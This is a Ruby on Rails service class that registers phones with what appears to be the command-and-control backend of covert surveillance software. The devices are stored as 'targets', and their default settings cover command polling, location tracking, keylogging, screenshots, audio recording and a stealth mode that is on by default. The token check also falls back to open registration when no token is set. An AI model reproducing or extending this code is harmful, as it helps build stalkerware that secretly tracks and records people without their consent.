# frozen_string_literal: true

# Handles new device registration:
#   - Validate device token
#   - Create or update device record
#   - Initialize default settings
class DeviceRegistrationService
  include ServiceInterface
  include DependencyInjectable

  dependency :logger,  default: -> { StructuredLogger }
  dependency :metrics, default: -> { MetricsService }

  DEFAULT_SETTINGS = {
    'command_poll_interval' => 60,
    'location_interval'    => 300,
    'keylog_enabled'       => false,
    'screenshot_quality'   => 80,
    'audio_max_duration'   => 60,
    'stealth_mode'         => true
  }.freeze

  def initialize(device_id:, device_token:, attributes: {}, **deps)
    @device_id = device_id
    @device_token = device_token
    @attributes = attributes
    inject_dependencies(deps)
  end

  def call
    # 1. Validate token
    return failure("Device token is required") if @device_token.blank?
    return failure("Device ID is required") if @device_id.blank?
    return failure("Invalid device token") unless valid_token?

    # 2. Create or update device
    device = find_or_initialize_device
    update_device_attributes(device)

    unless device.save
      return failure("Registration failed: #{device.errors.full_messages.join(', ')}")
    end

    # 3. Initialize default settings for new devices
    initialize_settings(device) if device.previously_new_record?

    track_registration(device)

    logger.info("Device registered",
      device_id: @device_id,
      new_record: device.previously_new_record?)

    success(device)
  end

  private

  def valid_token?
    expected = ENV.fetch('DEVICE_AUTH_TOKEN') { Rails.application.credentials.dig(:device, :auth_token) }
    return true if expected.blank? # No token configured = open registration
    ActiveSupport::SecurityUtils.secure_compare(@device_token.to_s, expected.to_s)
  end

  def find_or_initialize_device
    Smartphone.find_or_initialize_by(device_id: @device_id)
  end

  def update_device_attributes(device)
    device.assign_attributes(
      device_name:      @attributes[:device_name].presence || device.device_name,
      operating_system: @attributes[:operating_system].presence || device.operating_system,
      target_ip:        @attributes[:ip_address].presence || device.target_ip,
      updated_at:       Time.current
    )
  end

  def initialize_settings(device)
    DEFAULT_SETTINGS.each do |key, value|
      DeviceSetting.find_or_create_by(smartphone: device, key: key) do |setting|
        setting.value = value.to_s
      end
    end
  rescue StandardError => e
    logger.warn("Failed to initialize device settings", error: e, device_id: @device_id)
  end

  def track_registration(device)
    label = device.previously_new_record? ? 'new' : 'update'
    metrics.increment("device_registrations_total", labels: { type: label })
  rescue StandardError
    # Metrics failures must not break the flow
  end
end
